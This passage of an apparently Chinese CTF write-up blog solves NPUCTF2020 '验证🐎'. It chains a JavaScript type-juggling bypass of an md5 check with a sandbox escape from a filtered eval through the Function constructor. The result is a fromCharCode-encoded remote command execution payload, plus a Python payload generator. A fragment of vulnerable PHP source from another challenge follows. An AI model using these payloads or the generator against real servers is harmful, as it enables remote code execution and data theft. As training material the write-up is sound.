class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieSession = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-session&#x27;</span>);<br><br><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><br><span class="hljs-keyword">const</span> keys = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./key.js&#x27;</span>).<span class="hljs-property">keys</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">md5</span>(<span class="hljs-params">s</span>) &#123;<br>  <span class="hljs-keyword">return</span> crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br>    .<span class="hljs-title function_">update</span>(s)<br>    .<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <span class="hljs-comment">//注意这个，是否存在绕过？</span><br>&#125; <span class="hljs-comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span><br><br><span class="hljs-keyword">const</span> template = fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>).<span class="hljs-title function_">toString</span>();<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">render</span>(<span class="hljs-params">results</span>) &#123;<br>  <span class="hljs-keyword">return</span> template.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;&#123;&#123;results&#125;&#125;&#x27;</span>, results.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&lt;br/&gt;&#x27;</span>));<br>&#125;<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">urlencoded</span>(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));<br>app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cookieSession</span>(&#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;PHPSESSION&#x27;</span>, <span class="hljs-comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span><br>  keys<br>&#125;));<br><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Object</span>);<br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(<span class="hljs-title class_">Math</span>);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  <span class="hljs-keyword">let</span> result = <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-keyword">const</span> results = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || [];<br>  <span class="hljs-keyword">const</span> &#123; e, first, second &#125; = req.<span class="hljs-property">body</span>;<br>  <span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>        result = <span class="hljs-title function_">saferEval</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">e</span>) || <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(e);<br>        result = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!&#x27;</span>;<br>      &#125;<br>      results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">`<span class="hljs-subst">$&#123;req.body.e&#125;</span>=<span class="hljs-subst">$&#123;result&#125;</span>`</span>);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    results.<span class="hljs-title function_">unshift</span>(<span class="hljs-string">&#x27;Not verified!&#x27;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (results.<span class="hljs-property">length</span> &gt; <span class="hljs-number">13</span>) &#123;<br>    results.<span class="hljs-title function_">pop</span>();<br>  &#125;<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = results;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span>));<br>&#125;);<br><br><span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);<br>  res.<span class="hljs-title function_">send</span>(fs.<span class="hljs-title function_">readFileSync</span>(<span class="hljs-string">&#x27;./index.js&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;<br>  res.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);<br>  req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">admin</span> || <span class="hljs-number">0</span>;<br>  res.<span class="hljs-title function_">send</span>(<span class="hljs-title function_">render</span>(req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> = req.<span class="hljs-property">session</span>.<span class="hljs-property">results</span> || []))<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Start listening&#x27;</span>)<br>&#125;);<br></code></pre></td></tr></table></figure><p>如果想利用<code>saferEval</code>，首先要满足这么个东西：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (first &amp;&amp; second &amp;&amp; first.<span class="hljs-property">length</span> === second.<span class="hljs-property">length</span> &amp;&amp; first!==second &amp;&amp; <span class="hljs-title function_">md5</span>(first+keys[<span class="hljs-number">0</span>]) === <span class="hljs-title function_">md5</span>(second+keys[<span class="hljs-number">0</span>]))<br></code></pre></td></tr></table></figure><p><code>js</code>这东西和<code>php</code>也存在强等于弱等于之类的问题，具体可以参考<code>susec</code>这道题：</p><p><a href="https://johnfrod.top/ctf/susec-ctf-2020web-0/">参考资料</a></p><p>所以令<code>first</code>为<code>&quot;0&quot;</code>,<code>second</code>为<code>[0]</code>即可(注意这里不能直接用数字，因为数字没有<code>length</code>属性)。</p><p>我们可以通过<code>JSON</code>格式提交数据，中间件将对其进行解析：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">use</span>(bodyParser.<span class="hljs-title function_">json</span>());<br></code></pre></td></tr></table></figure><p>可以<code>POST</code>提交：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;e&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;payload&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;first&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;second&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>payload</code>是<code>saferEval</code>函数的参数，看看<code>saferEval</code>干了啥：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">saferEval</span>(<span class="hljs-params">str</span>) &#123;<br>  <span class="hljs-keyword">if</span> (str.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="hljs-string">&#x27;&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">eval</span>(str); <br>&#125; <br></code></pre></td></tr></table></figure><p><a href="https://blog.z3ratu1.top/[NPUCTF2020]%E9%AA%8C%E8%AF%81%F0%9F%90%8E.html">参考资料</a></p><p><code>(?:Math(?:\.\w+)?)</code>：匹配 <code>Math.[0-9a-z]</code></p><p><code>[()+\-*/&amp;|^%&lt;&gt;=,?:]</code>：匹配中括号内任意一个字符（<code>\-</code>为减号）</p><p><code>(?:\d+\.?\d*(?:e\d+)?)</code>：匹配 数字开头  一个或零个点  一个或零个 e[0-9]</p><p><code> </code>：匹配空格</p><p>匹配到这些东西会替换成空，如果最终为空的话才能调用<code>eval</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span><br><span class="hljs-params">                    <span class="hljs-built_in">Math</span>.fromCharCode(<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">116</span>,<span class="hljs-number">117</span>,<span class="hljs-number">114</span>,<span class="hljs-number">110</span>,<span class="hljs-number">32</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">46</span>,<span class="hljs-number">109</span>,<span class="hljs-number">97</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">77</span>,<span class="hljs-number">111</span>,<span class="hljs-number">100</span>,<span class="hljs-number">117</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">113</span>,<span class="hljs-number">117</span>,<span class="hljs-number">105</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">104</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">100</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">95</span>,<span class="hljs-number">112</span>,<span class="hljs-number">114</span>,<span class="hljs-number">111</span>,<span class="hljs-number">99</span>,<span class="hljs-number">101</span>,<span class="hljs-number">115</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">101</span>,<span class="hljs-number">120</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">83</span>,</span><br><span class="hljs-params">                        <span class="hljs-number">121</span>,<span class="hljs-number">110</span>,<span class="hljs-number">99</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>)</span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><code>romCharCode</code> 是 JavaScript 中的方法，用于将 Unicode 编码转换为字符，相当于：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>先是这部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br><span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br></code></pre></td></tr></table></figure><p>node:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Object</span>]<br>&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure><p>返回了一个<code>Function</code>，<code>js</code>中每个函数实际上都是一个<code>Function</code> 对象。它可以动态的创建一个函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; (<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;&#125;).<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-keyword">return</span> a + b<span class="hljs-string">&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-params">add = Math.constructor.constructor(&#x27;</span>a<span class="hljs-string">&#x27;,&#x27;</span>b<span class="hljs-string">&#x27;,return a + b&#x27;</span></span>)<br>                                           ^^^^^^<br><br><span class="hljs-title class_">Uncaught</span> <span class="hljs-title class_">SyntaxError</span>: <span class="hljs-title class_">Unexpected</span> token <span class="hljs-string">&#x27;return&#x27;</span><br>&gt; add = <span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b&#x27;</span></span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br>&gt; sum = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;b&#x27;</span>,<span class="hljs-string">&#x27;return a + b &#x27;</span>)<br>[<span class="hljs-title class_">Function</span>: anonymous]<br>&gt; <span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>要执行的命令是：注意最后面加了个<code>()</code>表示立刻执行(自调用函数)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span>)()<br></code></pre></td></tr></table></figure><p>再把第一行加上，发现这东西就是个箭头函数自调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js">(<span class="hljs-function"><span class="hljs-params">Math</span>=&gt;</span><br>        (<span class="hljs-title class_">Math</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-property">constructor</span>,<br>                <span class="hljs-title class_">Math</span>.<span class="hljs-property">x</span>=<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-string">&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="hljs-params"></span>)<br>        )<br>)(<span class="hljs-title class_">Math</span>+<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/npuctf2020yzm1.png" alt="npuctf2020yzm1"></p><p>最后的<code>(Math+1)</code>这个参数其实是为了获取<code>String</code>对象，因为<code>fromCharCode</code>方法是个字符串方法，所以前面的<code>Math.constructor</code>啥的好像没有演示的必要？</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br>&gt; <span class="hljs-title class_">String</span>.<span class="hljs-property">constructor</span>.<span class="hljs-property">constructor</span><br>[<span class="hljs-title class_">Function</span>: <span class="hljs-title class_">Function</span>]<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen</span>(<span class="hljs-params">cmd</span>):<br>    s = <span class="hljs-string">f&quot;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;<span class="hljs-subst">&#123;cmd&#125;</span>&#x27;).toString()&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;,&#x27;</span>.join([<span class="hljs-built_in">str</span>(<span class="hljs-built_in">ord</span>(i)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s])<br><br><span class="hljs-built_in">print</span>(gen(<span class="hljs-string">&#x27;dir&#x27;</span>))<br></code></pre></td></tr></table></figure><p>PAYLOAD:</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dns">Content-Type: application/JSON<br><br>&#123;<br>  &quot;e&quot;: &quot;(Math=&gt;(Math=Math.constructor,Math.constructor(Math.fromCharCode(<span class="hljs-number">114,101,116,117</span>,<span class="hljs-number">114,110,32,112</span>,<span class="hljs-number">114,111,99,101</span>,<span class="hljs-number">115,115,46,109</span>,<span class="hljs-number">97,105,110,77</span>,<span class="hljs-number">111,100,117,108</span>,<span class="hljs-number">101,46,114,101</span>,<span class="hljs-number">113,117,105,114</span>,<span class="hljs-number">101,40,39,99</span>,<span class="hljs-number">104,105,108,100</span>,<span class="hljs-number">95,112,114,111</span>,<span class="hljs-number">99,101,115,115</span>,<span class="hljs-number">39,41,46,101</span>,<span class="hljs-number">120,101,99,83</span>,<span class="hljs-number">121,110,99,40</span>,<span class="hljs-number">39,99,97,116</span>,<span class="hljs-number">32,47,102,108</span>,<span class="hljs-number">97,103,39,41</span>,<span class="hljs-number">46,116,111,83</span>,<span class="hljs-number">116,114,105,110</span>,<span class="hljs-number">103,40,41</span>))()))(Math+<span class="hljs-number">1</span>)&quot;,<br>  &quot;first&quot;: [<span class="hljs-number">0</span>],<br>  &quot;second&quot;: &quot;<span class="hljs-number">0</span>&quot;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h4><p><code>js</code>弱相等？强相等？任意数据类型拼接后是字符串？<code>length</code>属性对于数字是否生效？<code>Function</code>对象？箭头函数自调用？<code>fromCharCode</code>方法？</p><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>进去首先是个注册登录界面，根据题目名就没往<code>SQL</code>注入那边想，注册一个用户登录然后上传图片：</p><p><img src="/img/qwb2019upload1.png" alt="qwb2019upload1"></p><p>这里的<code>cookie</code>已经是我解码后的数据(一串序列化后的用户信息)。</p><p>奇怪的是不管我怎么上传图片都是显示<code>404</code>。。他妈的可能环境有问题，留着后面再做吧</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>这题需要找源码，<code>buu</code>上直接给了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//show.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;./helper.php&quot;</span>);<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">show</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>])&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;delete_all&quot;</span>] == <span class="hljs-string">&quot;true&quot;</span>)&#123;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Delete_All_Images</span>();<br>&#125;<br>&#125;<br><span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">Get_All_Images</span>();<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">show</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$con</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;con = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;r00t&quot;</span>,<span class="hljs-string">&quot;pic_base&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">mysqli_connect_errno</span>(<span class="hljs-variable">$this</span>-&gt;con))&#123; <br>   <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connect MySQL Fail:&quot;</span>.<span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Get_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM images&quot;</span>;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$this</span>-&gt;con, <span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows &gt; <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>())&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>])&#123;<br>    <span class="hljs-variable">$attr_temp</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>, <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>).<span class="hljs-string">&#x27;*&#x27;</span>.<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-number">0</span>), <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;attr&quot;</span>]);<br><span class="hljs-variable">$attr</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$attr_temp</span>);<br>&#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;id=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>].<span class="hljs-string">&quot; filename=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;filename&quot;</span>].<span class="hljs-string">&quot; path=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;You have not uploaded an image yet.&lt;/p&gt;&quot;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$this</span>-&gt;con);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Delete_All_Images</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$sql</span> = <span 